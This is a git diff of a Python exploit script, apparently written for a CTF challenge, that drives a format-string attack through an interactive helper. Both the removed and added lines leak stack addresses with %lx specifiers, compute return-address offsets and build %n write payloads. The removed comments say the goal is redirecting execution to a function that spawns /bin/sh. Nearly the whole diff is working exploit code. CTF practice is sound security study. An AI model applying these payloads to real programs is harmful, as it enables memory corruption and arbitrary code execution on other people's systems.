@@ -12,9 +12,9 @@ context.bits = 64
 # nc = "c.unitedctf.ca"
 # port = 10033
 # r = remote.remote(nc,port)
-r = process.process(["/mnt/c/Users/massi/Downloads/Source(1)/worker2"])
+r = process.process(["/mnt/c/Users/massi/Downloads/valley"])
 
-
+ #
 def readline(endOfLine="\n"):
     data = b""
     rec = ""
@@ -43,26 +43,28 @@ def sendline(toSend):
 def sendbytes(toSend: bytes):
     r.send(toSend)   
     
-interactive = InteractiveNC(r,command_prefix="!")
 
+vars = {
+    "f1":b"%21$lx",
+    "f2":b"%20$lx",
+    "f1_offset":"426",
+    "f2_offset":"8",
+    "payload":b"%95409997116009x%10$nAAAAAAA"
+}
+interactive = InteractiveNC(r,vars=vars,command_prefix="!")
 interactive.add_input("!b")
-interactive.add_input("0")
-# Leaks an address from the stack
-interactive.add_input("%372$lx")
+interactive.add_input("!f1")
 interactive.add_input("!i")
-interactive.add_input("!s 2 all addr")
-# Offset of the stack return address to the leaked address 
-interactive.add_input("!v off 3368")
-interactive.add_input("!10 addr")
-interactive.add_input("!+ addr off return_addr")
-# %4200224x = 0x401720 <- return_addr of exec func with /bin/sh
-# %10$n = 10 <- write to the address at the 10th argument
-# 12 <- padding to reach the 10th argument
-interactive.add_input("!v payload %4200224x%10$n12")
-interactive.add_input("!16 return_addr")
-interactive.add_input("!e util.packing.p64(int(return_addr, 16))")
-# append the stack return address to the payload
-interactive.add_input("!a payload last_eval_res fmtstr_payload")
-interactive.add_input("!d hex")
-interactive.add_input("!pid")
+interactive.add_input("!s all f1_res")
+interactive.add_input("!sl f1_res 27 39 f1_addr")
+interactive.add_input("!10 f1_addr")
+interactive.add_input("!- f1_addr f1_offset f1_addr")
+interactive.add_input("!b")
+interactive.add_input("!f2")
+interactive.add_input("!i")
+interactive.add_input("!s all f2_res")
+interactive.add_input("!sl f2_res 27 39 f2_addr")
+interactive.add_input("!10 f2_addr")
+interactive.add_input("!- f2_addr f2_offset f2_addr")
+interactive.add_input("!e b'%' + f2_addr + b'x%10$nAAAAAAA' + util.packing.p64(int(f1_addr))")
 interactive.interactive()
